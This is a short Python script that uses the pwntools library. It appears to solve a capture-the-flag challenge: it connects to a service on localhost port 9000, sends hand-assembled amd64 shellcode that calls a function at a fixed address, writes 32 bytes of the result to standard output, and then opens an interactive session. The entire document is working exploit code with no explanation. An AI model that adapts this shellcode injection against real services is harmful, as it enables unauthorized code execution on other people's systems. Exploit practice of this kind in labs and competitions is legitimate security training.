from pwn import *

context.os = 'linux'
context.arch = 'amd64'

r = remote('localhost', 9000)
print(r.recvline())
print(r.recvuntil("go:"))
shellcode = asm('''
    mov dil, 1
    mov eax, 0x401421
    call rax
    mov edi, 1
    mov rsi, rax
    mov dl, 32
    xor rax, rax
    mov al, 1
    syscall
''', vma=0x400000)
r.sendline(shellcode)
r.interactive()
